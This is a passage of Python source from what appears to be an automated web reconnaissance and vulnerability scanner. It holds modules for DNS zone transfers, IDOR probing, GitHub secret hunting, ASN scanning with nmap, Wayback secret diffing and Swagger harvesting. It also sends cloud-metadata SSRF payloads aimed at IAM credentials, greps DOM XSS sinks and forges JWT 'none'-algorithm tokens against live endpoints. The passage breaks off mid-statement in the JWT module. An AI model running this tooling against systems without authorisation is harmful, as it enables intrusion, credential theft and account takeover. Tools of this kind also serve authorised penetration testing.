            # Try to get NS via dig
            out = await run_cmd(["dig", "+short", "NS", self.domain], timeout=15)
            ns_servers = [l.strip().rstrip(".") for l in out.splitlines() if l.strip()]
        else:
            ns_servers = [r[0].strip().rstrip(".") for r in ns_records]

        if not ns_servers:
            warn("No NS servers found — skipping AXFR")
            self.db.mark_done("dns_axfr")
            return

        info(f"Attempting AXFR on {C.CYAN}{len(ns_servers)}{C.RESET} NS servers: {', '.join(ns_servers[:3])}")
        axfr_found = []

        for ns in ns_servers:
            info(f"  Trying AXFR from {ns}...")
            out = await run_cmd(
                ["dig", f"@{ns}", self.domain, "AXFR"],
                timeout=30
            )
            if out and ("Transfer failed" not in out and "REFUSED" not in out):
                # Parse records from output
                records = []
                for line in out.splitlines():
                    if line.strip() and not line.startswith(";") and self.domain in line:
                        records.append(line.strip())
                        # Extract hostnames
                        parts = line.split()
                        if parts and self.domain in parts[0]:
                            hostname = parts[0].rstrip(".").lower()
                            if hostname != self.domain and hostname.endswith(f".{self.domain}"):
                                self.db.add_subdomain(hostname, "axfr")

                if records:
                    axfr_found.append((ns, records))
                    warn(f"  {C.RED}AXFR SUCCESS{C.RESET} from {ns}! {len(records)} records exposed")
                    axfr_file = f"{self.outdir}/raw/axfr_{ns.replace('.','_')}.txt"
                    with open(axfr_file, "w") as f:
                        f.write(f"; AXFR from {ns} for {self.domain}\\n")
                        f.write("\\n".join(records))
                    self.db.add_sensitive(
                        f"dns://{ns}", "0", "CRITICAL",
                        f"DNS Zone Transfer allowed from {ns} — {len(records)} records exposed"
                    )
                else:
                    info(f"  AXFR refused/empty from {ns}")
            else:
                info(f"  AXFR refused from {ns}")

        if axfr_found:
            success(f"ZONE TRANSFER: {C.RED}VULNERABLE{C.RESET} — {sum(len(r) for _,r in axfr_found)} records leaked!")
        else:
            success(f"Zone transfer: {C.GREEN}secure{C.RESET} — AXFR refused by all NS servers")

        self.db.mark_done("dns_axfr")

    # ─── MODULE 21: IDOR DETECTION ─────────────────────────────────────────
    async def idor_detection(self):
        section("MODULE 21 — IDOR DETECTION")
        if self._skip("idor"): return

        # Find URLs with numeric IDs
        all_urls = self.db.conn.execute(
            "SELECT url FROM urls ORDER BY id LIMIT 10000"
        ).fetchall()

        NUMERIC_PATTERNS = [
            r"([?&](id|user_?id|uid|userid|account_?id|account|order_?id|order|"
            r"product_?id|item_?id|item|customer_?id|customer|profile_?id|"
            r"invoice_?id|ticket_?id|request_?id|record_?id|doc_?id|file_?id|"
            r"message_?id|chat_?id|session_?id|transaction_?id|payment_?id|"
            r"member_?id|group_?id|org_?id|project_?id|task_?id|pid|rid|oid|"
            r"tid|nid|cid|aid|mid|bid|gid)=)([0-9]+)",
            # Also path-based IDs: /users/123, /orders/456
            r"/(users?|orders?|products?|accounts?|customers?|items?|profiles?|"
            r"invoices?|tickets?|records?|documents?|files?|messages?|"
            r"transactions?|payments?|members?|groups?|projects?|tasks?)/([0-9]+)",
        ]

        idor_candidates = {}  # url -> [(param, value)]
        for row in all_urls:
            url = row[0]
            for pattern in NUMERIC_PATTERNS:
                for m in re.finditer(pattern, url, re.IGNORECASE):
                    groups = m.groups()
                    param  = groups[-2] if len(groups) >= 2 else "id"
                    value  = groups[-1]
                    try:
                        id_val = int(value)
                        if 1 <= id_val <= 99999999:  # reasonable range
                            if url not in idor_candidates:
                                idor_candidates[url] = []
                            idor_candidates[url].append((param, value, id_val))
                    except ValueError:
                        pass

        if not idor_candidates:
            info("No numeric ID parameters found — skipping IDOR")
            self.db.mark_done("idor")
            return

        # Deduplicate — keep one example per unique endpoint pattern
        deduped = {}
        for url, params in idor_candidates.items():
            # Normalize URL pattern (replace ID with {id})
            pattern_key = re.sub(r"=[0-9]+", "={id}", url)
            pattern_key = re.sub(r"/[0-9]+(/|$)", "/{id}\\\\1", pattern_key)
            if pattern_key not in deduped:
                deduped[pattern_key] = (url, params)

        info(f"Testing {C.CYAN}{len(deduped)}{C.RESET} unique IDOR patterns...")
        loop = asyncio.get_event_loop()
        found_idors = []

        def _test_idor(url, param, value, id_val):
            results = []
            # Try neighboring IDs
            test_ids = [id_val - 1, id_val + 1, id_val + 100, 1, 2, 0]
            try:
                # Get baseline response for original ID
                orig_req = urllib.request.Request(
                    url, headers={"User-Agent": "Mozilla/5.0"}
                )
                with urllib.request.urlopen(orig_req, timeout=8) as r:
                    orig_size = int(r.headers.get("Content-Length", 0)) or len(r.read())
                    orig_code = r.status
            except Exception:
                return results

            for test_id in test_ids[:4]:
                test_url = url.replace(f"{param}={value}", f"{param}={test_id}")
                test_url = re.sub(f"/{value}(/|$)", f"/{test_id}\\\\1", test_url)
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0"}
                    )
                    with urllib.request.urlopen(req, timeout=8) as r:
                        body = r.read(2000)
                        test_size = len(body)
                        test_code = r.status
                        # Flag if: 200 response, similar size (within 50%), different ID
                        if (test_code == 200 and orig_code == 200
                                and test_size > 100
                                and 0.3 < test_size / max(orig_size, 1) < 3.0):
                            results.append((test_url, test_code, test_size,
                                          f"ID {value}→{test_id}, size {orig_size}→{test_size}"))
                except Exception:
                    pass
            return results

        sem = asyncio.Semaphore(15)
        async def check_idor(url, params):
            async with sem:
                all_results = []
                for param, value, id_val in params[:2]:
                    r = await loop.run_in_executor(
                        None, _test_idor, url, param, value, id_val
                    )
                    all_results.extend(r)
                return all_results

        tasks = [check_idor(url, params) for _, (url, params) in list(deduped.items())[:100]]
        all_results = await asyncio.gather(*tasks)

        for results in all_results:
            for test_url, code, size, detail in results:
                found_idors.append((test_url, code, detail))
                self.db.add_sensitive(
                    test_url, str(code), "HIGH",
                    f"Potential IDOR: {detail}"
                )
                warn(f"  {C.ORANGE}IDOR?{C.RESET} {test_url[:80]}")
                info(f"    {detail}")

        # Write all candidates for manual review
        with open(f"{self.outdir}/raw/idor_candidates.txt", "w") as f:
            f.write(f"IDOR Candidates for {self.domain}\\n")
            f.write("="*50 + "\\n\\n")
            f.write(f"Total patterns found: {len(deduped)}\\n")
            f.write(f"Potential IDORs: {len(found_idors)}\\n\\n")
            f.write("All numeric ID URLs (manual testing recommended):\\n")
            for pattern_key in list(deduped.keys())[:200]:
                f.write(f"  {pattern_key}\\n")
            if found_idors:
                f.write("\\nHigh-confidence findings:\\n")
                for url, code, detail in found_idors:
                    f.write(f"  [{code}] {url}\\n    {detail}\\n")

        success(f"IDOR: {C.GREEN}{len(found_idors)}{C.RESET} potential, {len(deduped)} patterns logged")
        self.db.mark_done("idor")



    # --- MODULE 22: GITHUB SECRET HUNTING -----------------------------------------
    async def github_hunt(self):
        section("MODULE 22 -- GITHUB SECRET HUNTING")
        if self._skip("github_hunt"): return
        base  = self.domain.split(".")[0]
        token = os.environ.get("GITHUB_TOKEN", "")
        h = {"User-Agent":"ReconX2/2.3.0",
             "Accept":"application/vnd.github.v3+json"}
        if token:
            h["Authorization"] = f"token {token}"
            info("GitHub: using API token (higher rate limit)")
        else:
            info("GitHub: no GITHUB_TOKEN set — limited rate")
        QUERIES = [
            f'"{self.domain}" password',
            f'"{self.domain}" api_key',
            f'"{self.domain}" secret',
            f'"{self.domain}" token',
            f'"{base}" api_key language:python',
            f'"{base}" password language:javascript',
            f'"{base}" database_url',
            f'org:{base} filename:.env',
            f'org:{base} filename:config.json',
            f'org:{base} filename:credentials',
        ]
        found_items = []
        loop = asyncio.get_event_loop()
        def _search(query):
            try:
                enc = urllib.parse.quote(query)
                req = urllib.request.Request(
                    f"https://api.github.com/search/code?q={enc}&per_page=10", headers=h)
                with urllib.request.urlopen(req, timeout=15) as r:
                    data = json.loads(r.read().decode())
                    return [(it.get("html_url",""), it.get("name",""),
                             it.get("repository",{}).get("full_name",""), query)
                            for it in data.get("items",[])[:5]]
            except Exception: return []
        def _org():
            try:
                req = urllib.request.Request(
                    f"https://api.github.com/orgs/{base}/repos?per_page=30&sort=pushed",
                    headers=h)
                with urllib.request.urlopen(req, timeout=10) as r:
                    data = json.loads(r.read().decode())
                    return [(r.get("full_name",""), r.get("html_url",""),
                             r.get("language",""), r.get("private",False))
                            for r in data[:30]]
            except Exception: return []
        info(f"Running {len(QUERIES)} GitHub search queries...")
        for i, q in enumerate(QUERIES):
            if i > 0:
                await asyncio.sleep(7 if not token else 2)
            for item in await loop.run_in_executor(None, _search, q):
                url, fname, repo, query = item
                if not any(x[0]==url for x in found_items):
                    found_items.append(item)
                    warn(f"  {C.ORANGE}GITHUB{C.RESET} [{repo}] {fname}: {url[:70]}")
        org_repos = await loop.run_in_executor(None, _org)
        if org_repos:
            info(f"  Found {C.GREEN}{len(org_repos)}{C.RESET} public repos for org '{base}'")
        with open(f"{self.outdir}/raw/github_findings.txt","w") as f:
            f.write(f"GitHub Intel for {self.domain}\n" + "="*50 + "\n\n")
            if org_repos:
                f.write(f"[ORG: {base}] {len(org_repos)} repos\n")
                for nm, hu, lang, priv in org_repos:
                    f.write(f"  {'[PRIV]' if priv else '[PUB] '} {nm} ({lang}) {hu}\n")
            f.write("\n[SEARCH RESULTS]\n")
            for url, fname, repo, q in found_items:
                f.write(f"  [{repo}] {fname}\n  Query: {q}\n  URL: {url}\n\n")
            if not found_items:
                f.write("No secrets found in public code.\n")
        success(f"GitHub: {C.GREEN}{len(found_items)}{C.RESET} findings, {len(org_repos)} repos")
        self.db.mark_done("github_hunt")

    # --- MODULE 23: ASN ENUMERATION -----------------------------------------------
    async def asn_enum(self):
        section("MODULE 23 -- ASN ENUMERATION")
        if self._skip("asn_enum"): return
        target_ip = self.db.get_meta("target_ip","")
        if not target_ip:
            try: target_ip = socket.gethostbyname(self.domain)
            except Exception:
                warn("Cannot resolve IP"); self.db.mark_done("asn_enum"); return
        info(f"ASN enum for {C.CYAN}{target_ip}{C.RESET}")
        loop = asyncio.get_event_loop()
        def _bgp(ip):
            try:
                req = urllib.request.Request(f"https://api.bgpview.io/ip/{ip}",
                    headers={"User-Agent":"ReconX2/2.3.0"})
                with urllib.request.urlopen(req, timeout=15) as r:
                    return json.loads(r.read().decode())
            except Exception: return {}
        def _ipi(ip):
            try:
                req = urllib.request.Request(f"https://ipinfo.io/{ip}/json",
                    headers={"User-Agent":"ReconX2/2.3.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    return json.loads(r.read().decode())
            except Exception: return {}
        bgp, ipi = await asyncio.gather(
            loop.run_in_executor(None, _bgp, target_ip),
            loop.run_in_executor(None, _ipi, target_ip))
        asn_num, asn_name, all_pfx = "", "", []
        if bgp.get("status") == "ok":
            for obj in bgp.get("data",{}).get("prefixes",[])[:1]:
                asn_num  = str(obj.get("asn",{}).get("asn",""))
                asn_name = obj.get("asn",{}).get("name","")
        if not asn_num and ipi:
            org = ipi.get("org","")
            m = re.search(r"AS(\d+)", org)
            if m: asn_num = m.group(1); asn_name = org
        if not asn_num:
            warn("Could not determine ASN"); self.db.mark_done("asn_enum"); return
        info(f"  {C.GREEN}AS{asn_num}{C.RESET} -- {asn_name}")
        def _pfx(asn):
            try:
                req = urllib.request.Request(f"https://api.bgpview.io/asn/{asn}/prefixes",
                    headers={"User-Agent":"ReconX2/2.3.0"})
                with urllib.request.urlopen(req, timeout=15) as r:
                    d = json.loads(r.read().decode())
                    return [p.get("prefix","") for p in
                            d.get("data",{}).get("ipv4_prefixes",[]) if p.get("prefix")]
            except Exception: return []
        all_pfx = await loop.run_in_executor(None, _pfx, asn_num)
        info(f"  {C.GREEN}{len(all_pfx)}{C.RESET} IPv4 prefixes owned by {asn_name}")
        found_hosts = []
        scannable = [p for p in all_pfx[:20] if "/" in p and int(p.split("/")[1]) >= 24]
        if scannable and tool_exists("nmap"):
            info(f"  Scanning {len(scannable[:5])} small blocks for web ports...")
            for prefix in scannable[:5]:
                out = await run_cmd(["nmap","-p","80,443,8080,8443","--open","-T4",
                                     "-n","--min-rate","2000","-oG","-",prefix], timeout=120)
                for line in out.splitlines():
                    if "Ports:" in line and "open" in line:
                        ipm = re.search(r"Host: (\d+\.\d+\.\d+\.\d+)", line)
                        if ipm:
                            ip = ipm.group(1)
                            ports = re.findall(r"(\d+)/open", line)
                            found_hosts.append((ip, ports))
                            self.db.add_subdomain(ip, "asn-scan")
        with open(f"{self.outdir}/raw/asn_report.txt","w") as f:
            f.write(f"ASN Report for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"IP: {target_ip}\nASN: AS{asn_num}\nOrg: {asn_name}\n\n")
            f.write(f"IPv4 Prefixes ({len(all_pfx)}):\n")
            for p in all_pfx: f.write(f"  {p}\n")
            if found_hosts:
                f.write(f"\nWeb Hosts Found ({len(found_hosts)}):\n")
                for ip, ports in found_hosts: f.write(f"  {ip}:{','.join(ports)}\n")
        success(f"ASN: AS{asn_num} | {len(all_pfx)} prefixes | {len(found_hosts)} web hosts")
        self.db.mark_done("asn_enum")

    # --- MODULE 24: WAYBACK DIFF --------------------------------------------------
    async def wayback_diff(self):
        section("MODULE 24 -- WAYBACK MACHINE DIFF")
        if self._skip("wayback_diff"): return
        info("Fetching historical JS snapshots from Wayback CDX...")
        loop = asyncio.get_event_loop()
        def _cdx():
            try:
                url = (f"http://web.archive.org/cdx/search/cdx"
                       f"?url=*.{self.domain}/*.js&output=json"
                       f"&fl=timestamp,original&collapse=original&limit=300")
                req = urllib.request.Request(url, headers={"User-Agent":"ReconX2/2.3.0"})
                with urllib.request.urlopen(req, timeout=30) as r:
                    return json.loads(r.read().decode())[1:]
            except Exception: return []
        records = await loop.run_in_executor(None, _cdx)
        info(f"  {C.CYAN}{len(records)}{C.RESET} historical JS snapshots")
        if not records:
            self.db.mark_done("wayback_diff"); return
        url_ts = {}
        for rec in records:
            if len(rec) < 2: continue
            url_ts.setdefault(rec[1], []).append(rec[0])
        changed = {u: ts for u,ts in url_ts.items() if len(ts) >= 2}
        info(f"  {C.CYAN}{len(changed)}{C.RESET} JS files changed over time")
        SECRET_RE = [
            r"AKIA[0-9A-Z]{16}",
            r"AIza[0-9A-Za-z\-_]{35}",
            r"sk_(live|test)_[0-9a-zA-Z]{24,}",
            r"ghp_[a-zA-Z0-9]{36,}",
        ]
        diff_findings = []
        sem = asyncio.Semaphore(5)
        async def _diff(orig_url, timestamps):
            async with sem:
                ts = sorted(timestamps)
                old_c = await http_get(f"http://web.archive.org/web/{ts[0]}if_/{orig_url}", 15) or ""
                await asyncio.sleep(0.5)
                new_c = await http_get(f"http://web.archive.org/web/{ts[-1]}if_/{orig_url}", 15) or ""
                def find_s(text):
                    found = set()
                    for pat in SECRET_RE:
                        try:
                            for m in re.findall(pat, text, re.IGNORECASE):
                                s = m if isinstance(m,str) else (m[0] if m else "")
                                if s: found.add(s)
                        except Exception: pass
                    return found
                old_s, new_s = find_s(old_c), find_s(new_c)
                removed = old_s - new_s
                live    = new_s
                old_api = set(re.findall(r"/api/[a-zA-Z0-9/_-]{3,}", old_c))
                new_api = set(re.findall(r"/api/[a-zA-Z0-9/_-]{3,}", new_c))
                removed_paths = old_api - new_api
                if removed or live or removed_paths:
                    diff_findings.append({"url":orig_url,"old_ts":ts[0],"new_ts":ts[-1],
                        "removed":list(removed)[:5],"live":list(live)[:5],
                        "removed_paths":list(removed_paths)[:10]})
                    if removed or live:
                        warn(f"  {C.RED}WAYBACK SECRET{C.RESET}: {orig_url[:60]}")
                        for s in list((removed|live))[:2]:
                            print(f"    {C.ORANGE}{s[:80]}{C.RESET}")
                        for s in live:
                            self.db.add_sensitive(orig_url,"200","HIGH",
                                f"Secret in Wayback snapshot: {s[:60]}")
        await asyncio.gather(*[_diff(u,ts) for u,ts in list(changed.items())[:30]])
        with open(f"{self.outdir}/raw/wayback_diff.txt","w") as f:
            f.write(f"Wayback Diff for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"Analyzed: {min(len(changed),30)} files | Findings: {len(diff_findings)}\n\n")
            for fd in diff_findings:
                f.write(f"URL: {fd['url']}\n  {fd['old_ts']} -> {fd['new_ts']}\n")
                for s in fd["live"]: f.write(f"  LIVE: {s[:80]}\n")
                for s in fd["removed"]: f.write(f"  REMOVED: {s[:80]}\n")
                for p in fd["removed_paths"]: f.write(f"  API GONE: {p}\n")
                f.write("\n")
        success(f"Wayback diff: {C.GREEN}{len(diff_findings)}{C.RESET} files with secrets/changes")
        self.db.mark_done("wayback_diff")

    # --- MODULE 25: SWAGGER HARVEST -----------------------------------------------
    async def swagger_harvest(self):
        section("MODULE 25 -- SWAGGER / OPENAPI HARVEST")
        if self._skip("swagger_harvest"): return
        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("swagger_harvest"); return
        SPEC_PATHS = [
            "/swagger.json","/swagger.yaml","/openapi.json","/openapi.yaml",
            "/api/swagger.json","/api/openapi.json",
            "/api/v1/swagger.json","/api/v2/swagger.json",
            "/v1/swagger.json","/v2/swagger.json","/v1/openapi.json",
            "/api-docs","/api-docs.json","/api/docs",
            "/swagger-ui.html","/docs/swagger.json","/rest/swagger.json",
        ]
        info(f"Probing {len(live_urls)} hosts x {len(SPEC_PATHS)} spec paths...")
        all_specs = []
        loop = asyncio.get_event_loop()
        def _fetch(base, path):
            url = base.rstrip("/") + path
            try:
                req = urllib.request.Request(url,
                    headers={"User-Agent":"Mozilla/5.0","Accept":"application/json,*/*"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    if r.status != 200: return None
                    body = r.read(200000).decode("utf-8","ignore")
                    if any(k in body for k in
                           ['"swagger"','"openapi"','"paths"','swagger:','openapi:']):
                        return url, body
            except Exception: pass
            return None
        sem = asyncio.Semaphore(20)
        async def probe(base, path):
            async with sem:
                return await loop.run_in_executor(None, _fetch, base, path)
        results = await asyncio.gather(*[probe(b,p) for b in live_urls for p in SPEC_PATHS])
        for r in results:
            if r:
                url, body = r
                all_specs.append((url, body))
                warn(f"  {C.ORANGE}API SPEC{C.RESET}: {url}")
                self.db.add_sensitive(url,"200","HIGH","Swagger/OpenAPI spec exposed")
        if not all_specs:
            info("No API specs found"); self.db.mark_done("swagger_harvest"); return
        all_endpoints = []
        for spec_url, body in all_specs:
            spec = {}
            try: spec = json.loads(body)
            except Exception: pass
            for path, methods in (spec.get("paths",{}) or {}).items():
                for method, details in (methods or {}).items():
                    if method.upper() in ["GET","POST","PUT","DELETE","PATCH"]:
                        params = []
                        for p in (details or {}).get("parameters",[]):
                            pn = p.get("name","")
                            if pn: params.append(pn); self.db.add_param(pn,"Swagger param")
                        full_url = spec_url.rsplit("/",2)[0] + path
                        all_endpoints.append((method.upper(), full_url, params))
                        self.db.add_url(full_url, "swagger")
        with open(f"{self.outdir}/raw/swagger_endpoints.txt","w") as f:
            f.write(f"API Endpoints from {len(all_specs)} specs\n" + "="*50 + "\n\n")
            f.write(f"Total: {len(all_endpoints)} endpoints\n\n")
            for method, url, params in all_endpoints:
                f.write(f"[{method}] {url}\n")
                if params: f.write(f"  Params: {', '.join(params[:8])}\n")
        success(f"Swagger: {len(all_specs)} specs -> {len(all_endpoints)} endpoints extracted")
        self.db.mark_done("swagger_harvest")

    # --- MODULE 26: CLOUD METADATA SSRF ------------------------------------------
    async def cloud_metadata_ssrf(self):
        section("MODULE 26 -- CLOUD METADATA SSRF DETECTION")
        if self._skip("cloud_metadata"): return
        SSRF_PARAMS = {
            "url","uri","src","source","host","endpoint","proxy","callback",
            "webhook","fetch","dest","destination","redirect","redirect_url",
            "load","server","file","path","document","img","image","link",
            "target","resource","page","data","input","site","view","ref","feed",
        }
        all_urls = self.db.conn.execute(
            "SELECT url FROM urls WHERE has_params=1").fetchall()
        ssrf_targets = []
        for row in all_urls:
            url = row[0]
            for param in re.findall(r"[?&]([^=&]+)=", url):
                if param.lower() in SSRF_PARAMS:
                    ssrf_targets.append((url, param)); break
        if not ssrf_targets:
            info("No SSRF candidate params found")
            self.db.mark_done("cloud_metadata"); return
        info(f"Testing {C.CYAN}{len(ssrf_targets[:100])}{C.RESET} SSRF candidates...")
        PAYLOADS = [
            ("AWS IMDSv1",    "http://169.254.169.254/latest/meta-data/"),
            ("AWS IMDSv1 IAM","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("GCP Metadata",  "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure IMDS",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("Localhost",     "http://localhost/"),
        ]
        SIGS = ["ami-","instance-id","local-ipv4","computeMetadata",
                "security-credentials","meta-data","iam/"]
        found = []
        loop = asyncio.get_event_loop()
        def _test(url, param, pname, payload):
            test_url = re.sub(
                rf"([?&]{re.escape(param)}=)[^&]*",
                rf"\g<1>{urllib.parse.quote(payload, safe=':/@')}",
                url)
            try:
                req = urllib.request.Request(test_url,
                    headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    body = r.read(500).decode("utf-8","ignore")
                    if any(sig in body for sig in SIGS):
                        return test_url, r.status, body[:200], pname
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(300).decode("utf-8","ignore")
                    if any(sig in body for sig in SIGS):
                        return test_url, e.code, body[:200], pname
                except Exception: pass
            except Exception: pass
            return None
        sem = asyncio.Semaphore(10)
        async def test_one(url, param):
            async with sem:
                for pname, payload in PAYLOADS[:4]:
                    r = await loop.run_in_executor(None, _test, url, param, pname, payload)
                    if r: return r
            return None
        results = await asyncio.gather(*[test_one(u,p) for u,p in ssrf_targets[:100]])
        for r in results:
            if r:
                test_url, code, snippet, pname = r
                found.append((test_url, pname, snippet))
                self.db.add_sensitive(test_url,str(code),"CRITICAL",
                    f"SSRF Cloud Metadata [{pname}]: {snippet[:60]}")
                warn(f"  {C.RED}SSRF CRITICAL{C.RESET} [{pname}]: {test_url[:70]}")
                print(f"    {snippet[:100]}")
        with open(f"{self.outdir}/raw/ssrf_findings.txt","w") as f:
            f.write(f"SSRF Results for {self.domain}\n" + "="*50 + "\n\n")
            if found:
                for url, pname, snip in found:
                    f.write(f"[CRITICAL] {pname}\n  URL: {url}\n  Response: {snip}\n\n")
            else:
                f.write(f"Tested {len(ssrf_targets[:100])} candidates\nNo cloud metadata SSRF found.\n\n")
                f.write("SSRF candidates (manual testing):\n")
                for url, param in ssrf_targets[:50]: f.write(f"  [{param}] {url[:100]}\n")
        s = C.RED+"VULNERABLE"+C.RESET if found else C.GREEN+"clean"+C.RESET
        success(f"Cloud metadata SSRF: {s} ({len(found)} findings)")
        self.db.mark_done("cloud_metadata")

    # --- MODULE 27: DOM XSS SINK ANALYSIS ----------------------------------------
    async def dom_xss_analysis(self):
        section("MODULE 27 -- DOM XSS SINK ANALYSIS")
        if self._skip("dom_xss"): return
        js_files = read_file(f"{self.outdir}/js/js_files.txt")
        if not js_files:
            info("No JS files"); self.db.mark_done("dom_xss"); return
        info(f"Analyzing {C.CYAN}{min(len(js_files),200)}{C.RESET} JS files for DOM XSS sinks...")
        SINKS = [
            ("innerHTML",           "HIGH",     r"\.innerHTML\s*[+]?="),
            ("outerHTML",           "HIGH",     r"\.outerHTML\s*[+]?="),
            ("document.write",      "HIGH",     r"document\.write\s*\("),
            ("eval()",              "CRITICAL", r"\beval\s*\("),
            ("setTimeout(str)",     "HIGH",     r"setTimeout\s*\(\s*[a-zA-Z]"),
            ("setInterval(str)",    "HIGH",     r"setInterval\s*\(\s*[a-zA-Z]"),
            ("new Function()",      "HIGH",     r"new\s+Function\s*\("),
            ("location.href=",      "MEDIUM",   r"location\.href\s*="),
            ("location.assign()",   "MEDIUM",   r"location\.assign\s*\("),
            ("insertAdjacentHTML",  "HIGH",     r"insertAdjacentHTML\s*\("),
            ("jQuery.html()",       "HIGH",     r"\$\([^)]+\)\.html\s*\("),
        ]
        SOURCES = [
            r"location\.search", r"location\.hash", r"location\.href",
            r"document\.URL", r"document\.referrer", r"window\.name",
            r"document\.cookie", r"localStorage\.getItem",
            r"sessionStorage\.getItem", r"URLSearchParams",
        ]
        all_findings = []
        sem = asyncio.Semaphore(10)
        async def _analyze(url):
            async with sem:
                content = await http_get(url, timeout=12)
                if not content or len(content) < 100: return []
                found = []
                for sname, sev, pat in SINKS:
                    try:
                        for m in list(re.finditer(pat, content, re.IGNORECASE))[:5]:
                            ctx = content[max(0,m.start()-300):m.end()+300]
                            has_src = any(re.search(sp,ctx,re.IGNORECASE) for sp in SOURCES)
                            snippet = content[max(0,m.start()-40):m.end()+80].strip()
                            found.append({"url":url,"sink":sname,"severity":sev,
                                          "snippet":snippet[:120],"has_source":has_src})
                    except Exception: pass
                return found
        all_res = await asyncio.gather(*[_analyze(u) for u in js_files[:200]])
        seen = set()
        for results in all_res:
            for f in results:
                key = (f["url"], f["sink"])
                if key not in seen:
                    seen.add(key)
                    all_findings.append(f)
                    if f["has_source"] or f["severity"] == "CRITICAL":
                        col = C.RED if f["severity"]=="CRITICAL" else C.ORANGE
                        warn(f"  {col}DOM XSS {f['severity']}{C.RESET} [{f['sink']}] {f['url'][:55]}")
                        self.db.add_sensitive(f["url"],"200",f["severity"],
                            f"DOM XSS sink: {f['sink']} -- {f['snippet'][:60]}")
        with open(f"{self.outdir}/raw/dom_xss_findings.txt","w") as f:
            f.write(f"DOM XSS for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"JS analyzed: {min(len(js_files),200)} | Sinks: {len(all_findings)}\n\n")
            for sev in ["CRITICAL","HIGH","MEDIUM"]:
                items = [x for x in all_findings if x["severity"]==sev]
                if items:
                    f.write(f"[{sev}] {len(items)} findings\n")
                    for item in items[:20]:
                        flag = " <- SOURCE NEARBY" if item["has_source"] else ""
                        f.write(f"  {item['sink']}{flag} | {item['url']}\n")
                        f.write(f"  {item['snippet'][:100]}\n\n")
        high = [x for x in all_findings if x["has_source"] or x["severity"]=="CRITICAL"]
        success(f"DOM XSS: {C.RED if high else C.GREEN}{len(high)}{C.RESET} high-risk, {len(all_findings)} total")
        self.db.mark_done("dom_xss")



    # --- MODULE 28: JWT ATTACK TESTING -------------------------------------------
    async def jwt_attack(self):
        section("MODULE 28 -- JWT ATTACK TESTING")
        if self._skip("jwt_attack"): return

        info("Scanning for JWT tokens in responses and JS files...")
        loop = asyncio.get_event_loop()

        JWT_RE = re.compile(
            r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
        )

        found_jwts = []

        # 1) Find JWTs in all live host responses (headers + body)
        live_urls = self.db.get_live_urls()

        def _probe_jwt(url):
            tokens = []
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Mozilla/5.0 (ReconX2/2.3.0)"}
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    # Check Set-Cookie and Authorization headers
                    for hdr in ["set-cookie", "authorization", "x-access-token",
                                "x-auth-token", "x-jwt", "token"]:
                        val = r.headers.get(hdr, "")
                        for m in JWT_RE.findall(val):
                            tokens.append((url, "header:" + hdr, m))
                    # Check body
                    body = r.read(50000).decode("utf-8", errors="ignore")
                    for m in JWT_RE.findall(body):
                        tokens.append((url, "body", m))
            except Exception:
                pass
            return tokens

        sem = asyncio.Semaphore(15)
        async def probe_one(url):
            async with sem:
                return await loop.run_in_executor(None, _probe_jwt, url)

        all_results = await asyncio.gather(*[probe_one(u) for u in live_urls])
        for results in all_results:
            found_jwts.extend(results)

        # 2) Find JWTs in already-collected JS secrets
        js_secret_file = f"{self.outdir}/js/grep_secrets.txt"
        if os.path.exists(js_secret_file):
            content = open(js_secret_file).read()
            for m in JWT_RE.findall(content):
                found_jwts.append(("js_secrets", "js-file", m))

        if not found_jwts:
            info("No JWT tokens found to test")
            self.db.mark_done("jwt_attack")
            return

        # Deduplicate by token value
        seen_tokens = set()
        unique_jwts = []
        for url, source, token in found_jwts:
            if token not in seen_tokens:
                seen_tokens.add(token)
                unique_jwts.append((url, source, token))

        info(f"Found {C.CYAN}{len(unique_jwts)}{C.RESET} unique JWT tokens -- analyzing...")
        jwt_findings = []

        def _decode_jwt(token):
            """Decode JWT without verification."""
            import base64
            parts = token.split(".")
            if len(parts) != 3:
                return None, None
            try:
                # Decode header
                hdr_raw = parts[0] + "=="
                hdr = json.loads(base64.b64decode(hdr_raw).decode("utf-8", errors="ignore"))
                # Decode payload
                pay_raw = parts[1] + "=="
                pay = json.loads(base64.b64decode(pay_raw).decode("utf-8", errors="ignore"))
                return hdr, pay
            except Exception:
                return None, None

        def _test_none_alg(url, token):
            """Test JWT 'none' algorithm bypass."""
            parts = token.split(".")
            if len(parts) != 3:
                return None
            import base64
            # Create none-algorithm JWT
            none_hdr = base64.b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip("=")
            none_token = f"{none_hdr}.{parts[1]}."  # empty signature
            # Try it as auth header
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        "Authorization": f"Bearer {none_token}",
                        "User-Agent": "Mozilla/5.0"
                    }
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    if r.status in [200, 201, 204]:
                        return none_token, r.status
            except urllib.error.HTTPError as e:
                if e.code != 401:
                    return none_token, e.code
            except Exception:
                pass
            return None

        for url, source, token in unique_jwts[:20]:
            hdr, pay = _decode_jwt(token)
            if not hdr:
                continue

            alg     = hdr.get("alg", "unknown")
            sub     = pay.get("sub", pay.get("user_id", pay.get("id", ""))) if pay else ""
            role    = pay.get("role", pay.get("scope", "")) if pay else ""
            exp     = pay.get("exp", 0) if pay else 0
            is_exp  = exp < __import__("time").time() if exp else False

            finding = {
                "url": url, "source": source, "token": token[:40] + "...",
                "alg": alg, "sub": str(sub)[:30], "role": str(role)[:20],
                "expired": is_exp, "issues": []
            }

            # Flag weak algorithms
            if alg.lower() in ["none", "hs256"]:
                finding["issues"].append(f"Weak algorithm: {alg}")
                self.db.add_sensitive(url, "200", "HIGH",
